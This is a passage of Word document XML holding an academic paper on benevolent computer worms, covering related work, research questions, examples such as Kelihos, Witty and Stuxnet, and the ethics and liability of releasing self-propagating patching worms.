          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">tware and patch at-risk systems as well as </w:t>
      </w:r>
      <w:r w:rsidR="00406747">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>develop</w:t>
      </w:r>
      <w:r w:rsidR="00CE6CC7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a framework that could be </w:t>
      </w:r>
      <w:r w:rsidR="00F17211">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>utilized</w:t>
      </w:r>
      <w:r w:rsidR="00CE6CC7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to mitigate or reduce these risks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00C579E5">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc321736778"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Related Work</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="005F1E3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CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Henrl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> J. Isenberg of Symantec Corporation in </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>California</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> obtained a U.S. patent (# US 7,296,293 B2, Nov. 13, 2007) titled “A Benevolent Worm To Assess And Correct Com</w:t>
      </w:r>
      <w:r w:rsidR="004C06C5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">puter Security Vulnerabilities” </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>which worked in conjunction with a centralized controller system to propagate and manage the distribution of the computer worm.  Its purpose was to seek out vulnerable systems, copy itself to them, and analyze how to patch the system vulnerability.  It had code to interact with the anti-virus software on the vulnerable machine to determine if any patches were necessary.  In addition it also contained code to terminate replication if a certain number of copies had been made or a set period of time had expired.  The worm relied on the controller being able to provide anti-virus software that could be installed on the vulnerable machine if it was lacking such software.  In addition it could also install firewall software on the target machine.  Another characteristic in the patent description is that the worm could also notify the user of the machine via a GUI prompt that the machine had a discovered security vulnerability.  The worm relies on the availability of the worm controller in order to propagate and apply repairs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00F968F8"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Nicholas Weaver of UC Berkeley coauthored a work titled “A Taxonomy of Computer Worms” in 2003 which gives a thorough overview of the classes of worms and the type of malicious attackers who would use them.  It provides details on the strategies employed by worms in selecting targets, propagating, and their payloads or purposes.  While this work </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">focused on worms with malicious intents the same principals or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>techniques used by these worms are</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> also applicable in the development of benevolent worms</w:t>
      </w:r>
      <w:r>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only with a payload of doing good instead of harm.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00F00734">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc321736779"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Research Questions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>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ab/>
        <w:t xml:space="preserve">The purpose of this research is to evaluate the characteristics of computer worms, both benevolent and malicious, and </w:t>
      </w:r>
      <w:r w:rsidR="00F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>assess</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> those qualities that would be required to develop a </w:t>
      </w:r>
      <w:r w:rsidR="00F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">responsible </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>benevolent worm.  Some questions that must be addressed are:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F00734"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F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What are the possible risks with releasing a benevolent worm into the wild?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F00734"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F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What are the benefits?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F00734"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F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What characteristics would  a benevolent worm need to mitigate or reduce the risks of the benevolent worm causing more harm than good?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00F00734"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F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What would a</w:t>
      </w:r>
      <w:r w:rsidR="00EA6D1A">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> framework for a</w:t>
      </w:r>
      <w:r w:rsidRPr="00F00734">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> responsible benevolent worm be?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc321736780"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Is the worm or security problem that out of control?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>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One question to be asked is whether the computer security problem on the Internet and on private networks (commercial, industrial, etc.)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in such a state that conventional techniques (anti-virus, patching) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> not sufficient?  If security technologies such as firewalls and intrusion detection systems are sufficient then there would be no need for exploration into the development of self-reproducing automata (i.e. worms) (von Neumann 1966) to try to combat the threat of computer network intrusion and control.  Although techniques such as network firewalls, anti-virus, and automatic OS updates (which require user confirmation in the normal case) are considered standard practice in the industry those tools have still not stopped the threat </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">of computer malware, viruses, trojans, botnets, and worms.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The expectation of being able to ever stop every computer security threat may not be</w:t>
      </w:r>
      <w:r w:rsidR="002F5499">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> realistic</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, but the need for further evolved</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or next generation</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tools is necessary to continue to combat the threat.</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One example is the case of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kelihos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> botnet which was crippled by a joint effort with Microsoft and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kaspersky</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Lab by removing the command and control servers (Kirk 2012).  Researchers have noticed that a new variant of the worm code has been deployed in an attempt to regain control of the machines in the original botnet and form a new botnet thus exploiting the fact that the infected machines have still not been patched.</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Furthermore the advent of cloud computing has made it easier for anyone to quickly setup dedicated servers on the Internet.  This allows for cheap and easy setup of servers to use as botnet/worm command-and-control servers (Cloud 2010).  Since cloud providers aim to make it easy for their customers to sign-up for services more organizations/individuals are using this hosting model.  If not configured properly by the customer the cloud instances themselves would also be exposed to the Internet and taken over by malicious users.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">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Another example is the “Witty” worm itself (Shannon 2004).  The worm exploited buffer overflow vulnerabilities in a technology (firewall) designed to help prevent network intrusion.  The</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> release of the worm was seen just one day after the exploit was made public.  Even though a fix for the vulnerability was available the speed at which human operators could or would deploy it was not sufficient.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc321736781"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Ethical implications of benevolent computer works</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>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One question in regards to computer security is who is responsible for security related incidents whether it be attacks on the Internet originating from unsuspecting victims or the theft </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">of money via online banking hacks.  The ethical question of who should shoulder the responsibility financially is one of debate.  End-users have been </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>trained to ensure they have up-t</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o-date anti-virus installed</w:t>
      </w:r>
      <w:r>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and this is also a common expectation in businesses the cost of which is shouldered by the user/organization.  While many banks offer financial insurance against things like credit card theft the advent of online banking for businesses to do wire transfers and payments is not insured by all banks.  In one case a small business’s office computer used to do online banking was taken over by a malicious intruder remotely who transferred large sums of money out of their accounts (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Zetter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2011</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).  When the small business took the bank to court to s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ue to have them insure the loss</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the counts sided with the bank and stated that the bank was not responsible for the loss.  So a similar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ethical dilemma exists for benevolent worms.  If the author of a malicious worm is caught the injured parties can sue the author for damages.  On the other hand if an organization, individual, or government were to officially release a benevolent worm onto the Internet and the worm inadvertently caused damage to some party’s syst</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ems would it be ethical to hold the worm originator </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>financially responsible for the damage or should the party with vulnerable systems be held responsible since they allowed unsecured and vulnerable systems to possible be compromised and used by malicious persons</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> against the Internet community</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</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Yet another ethical and legal aspect is the use by governments or organizations </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>of</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a worm (benevolent or otherwise) as a method of counterattack.  Some view this as a tactic in “cyber-warfare” (Owens 2009).  The importance in traditional real-world warfare is to avoid civilian casualties during a</w:t>
      </w:r>
      <w:r w:rsidR="0088724B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack or counterattack on the enemy.  The authors relate the categories of innocent parties based on their involvement.  In terms of worms or botnets the civilians are people’s computers used or controlled by the party quite likely without their knowledge.  </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Another aspect of harm would be cutting off Internet access to your attacker but also cutting off innocent parties and therefore disabling their means of communication.  The third category could be likened to a critical computer server in a hospital that is being used as a control server for a large cyber attack.  Disabling the system could cause loss of life in the hospital to innocent parties as well as violate the Geneva convention.  These implications define who is responsible in a war for civilian casualties which can have large political ramifications.</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In addition it has been theorized that governments in cooperation with the U.S. Government secretly tested and deployed a worm known as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Stuxnet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to delay Iran’s nuclear capabilities (Broad 2011).  The ethical implication is that use of such technology is justifiable if it promotes the greater good and safety of the whole.  From Iran’s standpoint, however, it would be seen as a malicious worm and give them probab</w:t>
      </w:r>
      <w:r w:rsidR="000B23F7">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>le</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> cause to retaliate in a similar manner against critical infrastructure in other countries.  This calls for a clearer set of rules on what is ethically an actual benevolent worm (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kizza</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2006).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC"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Bruce Schneier in 2003 argued that benevolent worms were a bad idea because they accessed a computer system without consent or notification, made changes to it, and had the risk of causing more harm than actual good.  In 2011, however, Schneier changed his opinion to one of fixing an infected machine so as to remove its harmful effects from the Internet was worth the risk.  This changing attitude in the ethical standpoint comes from the greater good for the whole to address a problem that has grown larger and poses more risk to the Internet community.  This goes back to the ethical question of who is responsible for securing systems and correcting vulnerabilities.  In the technical report titled “The Internet Worm” by Denning he states: “system administrators have responsibilities to take steps that will minimize the risk of disruption” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>(Denning 1989).  What should be done when an administrator does not or cannot take all the necessary steps?  Is it ethical for a benevolent worm to then patch those systems that were not?</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sidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> strong ethical argument for benevolent worms is found in a work by John </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Aycoc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
